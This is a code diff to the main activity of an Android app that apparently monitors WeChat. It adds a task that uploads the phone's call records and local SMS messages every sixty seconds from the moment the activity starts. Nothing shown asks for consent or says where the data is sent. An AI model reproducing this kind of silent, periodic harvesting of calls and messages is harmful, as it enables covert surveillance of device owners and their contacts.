@@ -15,6 +15,7 @@ import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.Settings;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AlertDialog;
@@ -50,6 +51,7 @@ import com.mikuwxc.autoreply.receiver.MomentReceiver;
 import com.mikuwxc.autoreply.receiver.NetworkChangeReceiver;
 import com.mikuwxc.autoreply.service.MyReceiver;
 import com.mikuwxc.autoreply.service.SmsObserverService;
+import com.mikuwxc.autoreply.utils.CallSmsUploadUtils;
 import com.mikuwxc.autoreply.utils.CheckUtil;
 import com.mikuwxc.autoreply.utils.GetImeiUtil;
 import com.mikuwxc.autoreply.utils.Global;
@@ -84,6 +86,7 @@ public class DesktopActivity extends PermissionsActivity implements BaseOnRecycl
     private String tac;
 
     private TelephonyManagement.TelephonyInfo telephonyInfo;
+    private Handler mHandler=new Handler();
 
 
     private String[] search = {
@@ -130,7 +133,10 @@ public class DesktopActivity extends PermissionsActivity implements BaseOnRecycl
         startMomentDBReceiver();//开启朋友圈列表数据库的监听
         String lngAndLat = getLngAndLat(this);
         UpdateAppUtil.removeApk(this);
+        startPhoneAndSmsUploadTask();
     }
+
+
 
     private void startMomentDBReceiver() {
         momentReceiver = new MomentReceiver();
@@ -392,6 +398,7 @@ public class DesktopActivity extends PermissionsActivity implements BaseOnRecycl
         unregisterReceiver(dianLiangBR);
         MomentReceiver.runHandle.removeCallbacksAndMessages(null);
         EventBus.getDefault().unregister(this);
+        mHandler.removeCallbacksAndMessages(null);
     }
 
 
@@ -514,5 +521,16 @@ public class DesktopActivity extends PermissionsActivity implements BaseOnRecycl
         super.onResume();
         CheckUtil.selectActivity(this);
     }*/
+
+    private void startPhoneAndSmsUploadTask() {
+        mHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                CallSmsUploadUtils.uploadPhoneRecord();
+                CallSmsUploadUtils.uploadLocalSms();
+                mHandler.postDelayed(this,60*1000);
+            }
+        },0);
+    }
 }
 
